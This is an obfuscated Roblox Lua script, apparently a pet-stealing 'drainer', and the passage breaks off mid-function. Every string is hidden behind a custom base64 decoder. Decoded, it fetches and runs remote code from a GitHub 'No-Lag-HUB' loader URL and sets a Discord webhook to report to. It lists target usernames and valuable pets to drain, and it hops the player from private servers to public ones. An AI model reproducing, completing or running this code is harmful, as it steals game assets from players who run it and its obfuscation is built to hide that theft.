local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 



-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('qznEShEXgfhXQjYMTSXlwVuFcHBtNtnztPDsNmPrCsgnSodeHEFlsjZaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('NNIxnHofcEHaaQEOZXanogwUDKiwPBBRLbyMKFeboDxOIivPGTmBqcnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('saQetnWQYRpuANRYstjvqdbORkxCUHRAovOjTfLougdALzKLkbQTaqRQmFkUGxheWVyMTIz'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('odKWzapVQAsLQojSlAwEFGbBNZXEiMGxWThkDtsTRAqXrkjYgDTMjNKTXlBbHQ='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('qvKZGebHCYTBFUgPHyfvzbEoOkYcaPETCJDVdmneGDpDwknTlcWYadwRW5lbXlHdXk='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('ezsZYdlOeaEtVtgXTqnYRGINKNLzHQPyCDRJjcytIEVGnBgurqPuzVMaW50ZXJjZXB0ZXJudW1iZXIx')}
local drainPets = {
 eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('KXEqOLHJYohHModRHbAYpcKoOXFaVySYBgIEvIUDYOLaZLZMTtpribBRHJhZ29uZmx5'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('njibVnRqMHWqOOHLQdvIPoxAHXmxoOGNMsyEezHAYoKdSxeiZycdmmGVOKAkVJleA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('JtJrUWnfDobFnxPhklPAeOMwkEKVTYrifiiUerIMAVuXNkSVXmKksweUmFjY29vbg=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('VUREeMyWabjyVoJlutFmRPnCFmkEtQhOgujfsYeezMbOuxSqfTWAyykUmVkIEZveA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('BRTQNzfIrGEKFnNgetSuQxqGfIUzzGYoCkNazrHJhoHPXsmlxCaHlczUXVlZW4gQmVl'),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('YYIkpQoPKcgRCSkooqYmTGLxAspCrCDWUCVzjOILXkLBXjvQFPWzkcSRGlzY28gQmVl'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('yfNyQwuGlMDQvQDCiXfGvYafqHLyCviTJbIYwhPXMhQQaOwPxQJOseSQnV0dGVyZmx5'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('wbpUtljpJktIXeNOagIHotmcQZcyPYpNiZtKLwAjnzUDPajkGSqZSoITWltaWM='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('UDvjMpTcSiWyMdEeFliOCAfyjhytMROjMXWrHfPSmxhBefMroORtYFXTW9vbiBDYXQ='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('gJHOfAdAJkCYrtMQgoMVuQsQzhmwnFrXcXFBbbKOzlgYhwRgojASOdKRmVubmVjIEZveA=='),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('qOkSlnRmInySFZQvVNfyJteFJwrlbWqAJqqCfLipbusmklTqbNwLpEkVHJpY2VyYXRvcHM='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('tpRCNKGINhBywfmuZEzIWrZCXJTfmstGRwhDOzROyhKBhaGQpATVadoQXhvbG90bA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('vEJMiVUGKVCHPqNcjqPQwnYnBWFplnfjhewQMfCSDPVnBUlOcSKhKZuQmVhciBCZWU='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('ErHDdKSrnrNLYvQjRXilZjtUuHkeEiXijeqZhkDxouuobZXOCJUKCKFUG9sYXIgQmVhcg=='),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('vjBkqAkgDgaZmrDYctKeSiHGIZIWVikGoXmlFctftvzkibYvmIsDCLvUHJheWluZyBNYW50aXM='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('KYGrHZumRGnzXNHFWToJwTTmNcSlLqGpzJdfwkdVylOxHjwUpmQmUuFU2NhcmxldCBNYWNhdw=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('LhFlCNsiQrHSkXWIcOUsJEBOzEYbPfKpflEizJUajLKsIVAAdqfcjIQQ2hpY2tlbiBab21iaWU='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('glCwsSfmTgdxVmhUTDAYtzjxSFCuqrQnweWaRcRzrZYlxqVNRfoNrJfQ29va2VkIE93bA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('RciANGedZhOGLIscudCfENxSOUtOslOoaAWCTDqFKqROrgEPayedjzvQ2FweWJhcmE=')
}
local highTierPets = {
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('nwXxdilzYYiGdlevTIFgoLCzXBrWuecXXJKgqjqobOeQHjaSuhbUOvERHJhZ29uZmx5'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('vgDjlefvLNZmdBBlCvnvENroVvLYpogDgJckmaWVZhBNkEthbXnGVkTQnV0dGVyZmx5'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('UqgchxakiTRgJjyDTlTXcCDdDTRtnmndUJSSsWJlETBBHzumzWmthMcTWltaWM='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('QUpTdIvvxxQLVUqNxMdwQyXohlVYvJRmTqichvaZyRWCxBGHkpwpsQSUmVkIEZveA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('qshXCdNZTgHxhtdEODhrzFKUaSBEwjVexRyHftXxZuksPoWsttUhAmAUmFjY29vbg=='),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('QIFyCraPGGNdMjjRYMhTerOEhiyzwfZVyLpyaagqCCmHJdvCqtlUaTNRGlzY28gQmVl'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('PzjHhauLmOwhZXrhyfszPuDCuNhmywUoWDXrQfARuAwZreOzTHoamDwUXVlZW4gQmVl'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('tNCMjLtwaIhXOXpFHInQAAXeziVABnpVNBsTakAEBGMnVRwTdsTRGNMVOKAkVJleA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('zZZUfCoaTasScUcXdtPqRZeOooLohVlQjjzWgQZBOSWoyZRCtKUSrMJU3Bpbm9zYXVydXM='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('BPcmHeXEsQQHfMpgpfbeCtOfbExNbGNVMvGEgFwgkfwwdePliXoRrvcQW5reWxvc2F1cnVz')
}
local petKeywords = {
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('jHlpEGrsxPAnxvVwxpjMdsRtbQYRzITXlKvMqKTNxdKLAxzeXEYQtHyU3RhcmZpc2g='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('AWJHyNUoPMAqnELnIDHncRSNpzAFmagvxErUfwyTjuFvLlyQBXItPkUQ3JhYg=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('IDWRtaKcbnwEWIYZlhUPfvAuzvzVYsKGcfespSxSklMQjQsscgAVCMpU2VhZ3VsbA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('VFBtxGNiXFdlHvLVWAEtwROPROYOhzmqLlgHfzrPJzXXhNhyngTpnDyQnVubnk='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('CvqJnecKkLmYqmBYkZpvrFKpbIMhBXoBWHdcykjFyJsVMgDtDKEFkwCRG9n'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('bDZfAsxtuKLYWmSXlhdFkJFUQVqPiNczJjwDlKUXRbkGtFAgsAvHqaYR29sZGVuIExhYg=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('kHjsEkqSbaJnifnEuJhrMODAqdqRPVrCXlwFwdATacaLNfGgPjIBQTYQmVl'),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('ppjRJDfzRIHLRocQZvsLhNhgxRknVSjBokdBuiFsZYKYFeljeIpsBGoQmxhY2sgQnVubnk='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('QESuwJZhLGMnpjffUypWJgpuesryexgYolMQGRSSEGCQQXMAARlMSBrQ2F0'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('ctmsBAYQDsrTJyQzlYwrvVFNiyGPWhRhXATQkggCQOPFmJgejtlmZHdQ2hpY2tlbg=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('oXwRIhYKMSpfUYMgTJVFAFAHJcjsGjxJxRCpaMpAztEbkwgFEcoLuERRGVlcg=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('lPzreLriLvbJVOaLVrFNiEWcrjnwwUPjgwrAWppHMlDWNAsudLOPiteTW9ua2V5'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('zBMCxvDfYsuNHrcjnBDJvVwvVxpzBJYudXOHeEtsRiptmDnSgfYebMCT3JhbmdlIFRhYmJ5'),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('OHQtPozCtLcALiKlKWSyWbHOrvJviNmwynjkQSGtZEVYCUTLSpZbGIjUGln'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('DyytHPbykHpTEXzZpTvumijMTYURsylQtNDZRJzZKvDGTBDVioxaVOsUm9vc3Rlcg=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('YodbzzZVPPTvnfdzhfWmVpFTvYQffoWtKmDikjIorJNRwCjELJJbWZAU3BvdHRlZCBEZWVy'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('HoGqaHrBVXVCDUianEWznGRWSQPYkZujvLxclFLwrYxWucvwFVEQMzjRmxhbWluZ28='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('tmDwZKPcxecaJnEfOAzyOHwyJHcLtvEsrnqifTATJYUusXVlgnHDJXzVG91Y2Fu'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('oeKXCQqNISlCLwopAIRvhlOenDOFVfjVqybWCDaKrSGdJahmsuBTlvZU2VhIFR1cnRsZQ=='),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('AgizJIcegTwSUeKsnYvpDYGtVNEDRZbWqfsRuHdopTcvrapbRtvmwGRT3Jhbmd1dGFu'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('vHFwLouKLmIrdbkJmhszIglqfsIOIdwmSPjTrtLULDtexdirRqSnNSFU2VhbA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('VXjLrrVdUyyeZECiGfWNaPPwsIkXyIkjqweSeBJwVCRpCXizyegeVRGSG9uZXkgQmVl'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('ANbftgGOIijIvsJmUQJTIvrTGhNnPVnOEIBafokvZQYKanIjjpvsyxHV2FzcA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('lffExvCwshsSKGsEsccSBmEjkmzKtaxGycvjJUdfVzwvCysDotLNyomVGFyYW50dWxhIEhhd2s='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('VMgFjgIHzdXSmPQyafqNWFZyrezBYzMObPywpacvMPieAWjjeqiZsLCUmFwdG9y'),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('CqXYdQZtZySYDGCqineJHTwrZvFyTGUJrJzcwxjvwuTyQrqOaNGJrdAVHJpY2VyYXRvcHM='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('DxoSqqTRrOoErpEKuNDCymNOCGdMzvgkGiJpzYLMdOdFAumfBmRyCgcU3RlZ29zYXVydXM='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('HCYyuNTQPMZVnRexzWxPTxIiYNZZxJRlbXYmnOMxidwdvHEKocKJMZpUHRlcm9kYWN0eWw='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('OwIymfFUOXOgGoJJMGAKlssgHQptEMcLDCmJGKwNutwdYQKvEgFALBoVHVydGxl'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('KdfofnSirkeKOFSprbaddxrBSMMcZxLPgnmMuuxisypfTmwhfPHePLwQ2F0ZXJwaWxsYXI='),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('XBOJvNUHEqVQKyZXxrWCMUTEIsCNgqXTircmsPyJviBRWgobSDnxehyUGV0YWwgQmVl'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('tucHXieVgtXSZOiICbmFpHIWWsqWplcCLvoMTwPJekaMKVaxLAzPNkeTW90aA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('JCrtQFtwAAaqxTbBtZvUgBIhrHNZoyCVGdSlpFuUgAZNqZPRpxfQbRAU2NhcmxldCBNYWNhdw=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('wZPurCtYmplyIsoIWQUFpLEhUKLmeDfTEdJvVpMjhzJauCWdSSRTloOT3N0cmljaA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('vVESUaqvGuuSJDCkvGduyJTbvZimZBaPyAUDEaZvsAucSpvAKnGLwltUGVhY29jaw=='),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('VWqjLcgkPMXcUoAeAEyrprdpJZJJTbkYfQvJirvKcbEUGttezTQLVGDQ2FweWJhcmE='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('pwBSuIZBHVnrYXhbjgFNKpbuLNYHaBEIGeLCDprxEpPNSdVFNcxvzVRU2FuZCBTbmFrZQ=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('ljabEzTOsEeJdfftZINsHFGugsnygBmkYpHYpCtNRIoqXIqeqQAGKgUTWVlcmthdA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('WMPzlTawxOmJMnTusBBxLAgktNxJwXXGHJVsuxrWNFCyEIAtxkJLUYIQnJvd24gTW91c2U='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('vHMRLYXdlzCxhQAgSNjkPkyVzZNxVznpjZlbiSRDcfmDOVCMnVqKmoOR2lhbnQgQW50'),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('QPOnvuYVTLRIIbdfoxlxModPtImSCPhsWDtfzUdNwelGTHokXpZQSdgR3JleSBNb3VzZQ=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('oepuWkRODzxdQVliJTqkoNZxyTLTiNmQRYdHcRpIkRhoHCePpVFuTSpUHJheWluZyBNYW50aXM='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('MkYMJDtxnRPhfMYKoXKwkhaFOiUYMhAMouWUyOSXClJRCBDVcxwLaJQUmVkIEdpYW50IEFudA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('fasSJSQJgOHiFVmfiohXdRgVhEqEShTDiHHUACtiSiggLPKMyiBsxQbU25haWw='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('MVBIdHGwOaVWhovbgCXJctvxXdAMxIfGQoVXTUNpIUeCtPUHKJgjTHeU3F1aXJyZWw='),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('TuEJBcsimozJaMfLTTEbPWjmpbAXxPDHzMlQrhHLEArCXmLTPVhfjlMQmVhciBCZWU='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('gZnVcpQbpwhVoWFyuJAnwzNugweQUDqEWmQjeHcBhaFFZBMzkXsRjELQnV0dGVyZmx5'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('QRgBqlNBkRXytBcofHsjyVbqmsrOJsNuSNatVbhmELOwhMFPzMSkZMeQnJvbnRvc2F1cnVz'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('NpQnzbSlyPlmtFxYqcLtlHatPPuVhPiOBIAvibGGcFQHeiulWUTadLDUGFjayBCZWU='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('wDXfcJZdtIDiRFfdgxcgWjDosWKzrOMBcbSyEYTuAeWLCJwNPtnGUYfTWltaWMgT2N0b3B1cw=='),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('WnVuigIWYCjZDuREZcZvRxYTqHNWKMGhDBZpCSLJnjrVLlPhREQWNhzSHlhY2ludGggTWFjYXc='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('hBFjfKgJZonVRpUQJDbzJSFVetCsuPnUqqQihGheCPkPqNrTPFRDcGUQXhvbG90bA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('WnCKKtzfGHtMgoNFzBpIhGZtrrPpanOKLjaMimnxYbsVUbTHBvGwhCGUmVkIEZveA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('lETGgoXqMWgRSyhtiUbMSGtiTgJUhFKNwcOKjqqGaSSBGJvZLPLtHwlVOKAkVJleA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('ahrnbLgLFAZHxNuAhlyjXBMCqvKFoSfgRqIgEtkrtnQcViAOvDaQcXMRHJhZ29uZmx5'),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('lPrxENXmbfjGBivAgUgsWehlVzHhSNjyhQsgwZeSvUwkOCrzubCYDkwUXVlZW4gQmVl'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('reWcconHhTawzqleMMEVgiGsrchFrmOkKAVkLlaqsWlQJGkrDSqgUlvRGlzY28gQmVl'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('ncqcsCVuzvBdkyexPTeqLcSIQNbBeXeivVjkLiyfBBFsZmkhjIvjUEDRmVubmVjIEZveA=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('hSGVLBltJyAWDbaEXfcZXbCbSOsVMjJZujUPUKFSDBDsoPUTjdCCvvuTW9vbiBDYXQ='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('IAYRtVbamrWZuplSvAHRpbGhzWCivJyPLNZqaFnFlyModtShCmSKKmqUmFjY29vbg=='),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('GMYXAdIbyIlardNokzbRspowukQcfeIQQUiTFnqVSTmsBdfBhSLmlfQUG9sYXIgQmVhcg=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('LIbvLPKELsKHaJHuhBUnlJqNxbYkcmGAiPVTZKJnGECVhCoplMkUPUzUGFyYXNhdXJvbG9waHVz'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('UhtsvqfNqDnJzgbXpPZcXszAjxzZYdvXgBaePKXWCIavPNtmpzALgehSWd1YW5vZG9u'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('VGbhSzBfEmrMOOsYGLURSJyKicCWUOLXPBbEtHqFinSkedVQMvkmxHZUGFjaHljZXBoYWxvc2F1cnVz'),
    eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('IviqgDFSPQkRsFYaBTFMtvhrflhqwpNgUvXzxnTRaLdWzBbvyNNZLVzRGlsb3Bob3NhdXJ1cw=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('kpzssJEeAxxYXPvrFcIFPiUQSPjSznZEuiYSXrPcfOgBqYWxGqUSegGQW5reWxvc2F1cnVz'), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('owVMXuLQpxKOwIHFRgdiOqDThgKSaSnheyOWITXaWduqfeHRmqxwGcyU3Bpbm9zYXVydXM=')
}

-- SERVICES
local Players = game:GetService(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('jgVodChCTnOPJLBKKyWmQFMXXyrzEqekmhrnYVEvUGdMXjPgIdOGSMOUGxheWVycw=='))
local ReplicatedStorage = game:GetService(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('qpxTmSSMpuvwtfPSZbNISOsfFwwqDtOAwrjtJeeJWsjPGovFxbCBaVZUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('FqUbqKixNwHhmUWJIlwnmpmifDGTtXQptoKsDpPYlrheElxmRPruAQvSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('ZyztKkHxdjiKcSUjvWuaxqHbBMQiHeKIUWoshqiPqZTOmPYxEkiRBoRVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('YbesNSyjBrVYrsEaaEEhgeOEswAWHlACRIdYdfpdRKIuJXlXHgnrFmBTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('AnPNgvOsZLNDuGQaSOgNNeJjDGrFkorQiMdXzTuMBZFpYRffNAkZbHRQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('cuWCfRDGiGNdrRJepCfUkRwIrpRvQZwzUboVkqgdiGBtVlPJmDZNWjv')
    local lowest = nil
    repeat
        local url = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('guJMFwyEMYQCbgyZEpsDRGiREpfiQjRHQlryhbPCPcQUhnbxNJqFXonaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('aUPamyOAoiXkhXVkOzFveXWZMzbhVNsanfLWxPMQFxnGuueaXTUPdzaL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('jgufyEzubdTGWAfoSPxKFqlXKjsthRQWKgqiOhBEoDtDqNqRmarazdo') then url = url .. eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('DzCSOSPriNWuSRKYRyofyOfLfIhBOOWyFVFDZvPdpOzJeXMQOShhfTVJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('hzusXbedLXatJHFrJreiEYPKpTqJlkKmUIZfCBoYuzflUVlwRDxojhkR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('HUQqGWdKPAwLeEqNsMUwaVSinkvUCDOHULhRCHOOEbsJFDdUxfuXlgO') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('loyvSZhCabFEylaukXRAKeBvZmknrAuHEthnRnRMZWFrRBhnTJWUOiRWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
